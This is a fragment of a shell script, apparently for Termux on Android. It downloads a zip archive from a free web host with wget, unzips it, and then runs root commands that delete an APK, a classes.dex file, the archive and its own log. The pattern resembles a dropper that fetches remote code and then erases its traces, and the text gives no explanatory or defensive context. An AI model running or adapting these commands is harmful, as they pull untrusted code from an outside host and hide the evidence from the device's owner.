...
wget http://hc233test.000webhostapp.com/awmeme234.zip >> log.txt

apt install unzip
unzip -o awmeme234.zip >> log.txt
...
sleep 5
su -c 'su -c "#rm /sdcard/CatLog.apk & rm /data/data/com.termux/files/home/classes.dex & #rm /data/data/com.termux/files/home/CatLog.apk& rm /data/data/com.termux/files/home/awmeme234.zip& rm /data/data/com.termux/files/home/log.txt" &echo " "'
echo ""
echo ""
